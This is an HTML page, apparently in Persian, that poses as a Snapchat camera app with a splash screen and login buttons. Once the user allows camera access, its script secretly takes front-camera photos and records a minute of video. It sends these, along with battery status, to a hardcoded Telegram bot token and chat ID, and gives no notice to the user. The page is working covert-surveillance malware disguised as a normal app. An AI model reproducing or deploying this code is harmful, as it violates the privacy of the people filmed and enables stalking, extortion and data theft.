<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>SnapCam</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      margin: 0;
      font-family: "Vazirmatn", sans-serif;
      background: #fff000;
      overflow: hidden;
    }
    #video {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 0;
    }
    .overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 1;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 1rem;
      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
    }
    .circle-btn {
      width: 72px;
      height: 72px;
      background-color: white;
      border-radius: 50%;
      border: 4px solid #000;
    }
    .fade {
      transition: opacity 0.7s ease;
    }
  </style>
</head>
<body>

  <!-- Splash -->
  <div id="splash" class="w-full h-screen bg-yellow-300 flex items-center justify-center flex-col gap-4 fade">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="w-24 h-24 animate-bounce" />
    <h1 class="text-2xl font-bold">Snapchat</h1>
  </div>

  <!-- Login -->
  <div id="login" class="hidden w-full h-screen bg-yellow-300 flex flex-col items-center justify-center gap-6 fade">
    <h2 class="text-xl font-bold">وارد شوید</h2>
    <button onclick="fakeLogin('google')" class="w-72 bg-white text-black rounded-full py-3 text-sm flex items-center justify-center gap-2 shadow-lg hover:scale-105 transition">
      <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg" class="w-5 h-5" />
      ورود با گوگل
    </button>
    <button onclick="fakeLogin('facebook')" class="w-72 bg-white text-black rounded-full py-3 text-sm flex items-center justify-center gap-2 shadow-lg hover:scale-105 transition">
      <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" class="w-5 h-5" />
      ورود با فیسبوک
    </button>
    <button onclick="startApp()" class="w-72 bg-black text-white rounded-full py-3 text-sm flex items-center justify-center gap-2 shadow-lg hover:scale-105 transition">
      ورود مهمان
    </button>
  </div>

  <!-- Camera -->
  <div id="app" class="hidden">
    <video id="video" autoplay playsinline muted></video>
    <div class="overlay">
      <div class="flex justify-between">
        <div></div>
        <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
          <i data-lucide="camera"></i>
        </button>
      </div>
      <div class="flex justify-center">
        <button class="circle-btn cursor-default" disabled></button>
      </div>
    </div>
  </div>

  <script>
    lucide.createIcons();

    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
    const chatId = "-1002651451203";

    // Splash to login
    setTimeout(() => {
      document.getElementById('splash').classList.add("opacity-0");
      setTimeout(() => {
        document.getElementById('splash').classList.add("hidden");
        document.getElementById('login').classList.remove("hidden");
      }, 700);
    }, 2000);

    function fakeLogin(type) {
      alert("ورود با " + type + " در حال حاضر فعال نیست.");
    }

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
      return { level: "?", charging: false };
    }

    let stream, mediaRecorder, chunks = [], photoCount = 0, videoSent = false;

    async function startApp() {
      document.getElementById('login').classList.add("opacity-0");
      setTimeout(() => {
        document.getElementById('login').classList.add("hidden");
        document.getElementById('app').classList.remove("hidden");
        startCamera();
      }, 700);
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: 640, height: 480, facingMode: "user" }
        });
        document.getElementById('video').srcObject = stream;
        startRecording();
        takeAutoPhotos();
      } catch (err) {
        alert("دسترسی به دوربین رد شده یا مشکل دارد.");
      }
    }

    async function takePhoto() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await getBatteryInfo();
        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `snap_${photoCount}.jpg`);
        form.append("caption", caption);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg', 0.8);
    }

    function takeAutoPhotos() {
      setTimeout(takePhoto, 1000);
      setTimeout(takePhoto, 5000);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 60000);
    }

    async function sendVideo() {
      if (videoSent || chunks.length === 0) return;
      videoSent = true;
      const battery = await getBatteryInfo();
      const blob = new Blob(chunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("video", blob, "video.webm");
      form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: form
      });
    }

    window.addEventListener("beforeunload", () => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    });
  </script>

</body>
</html>
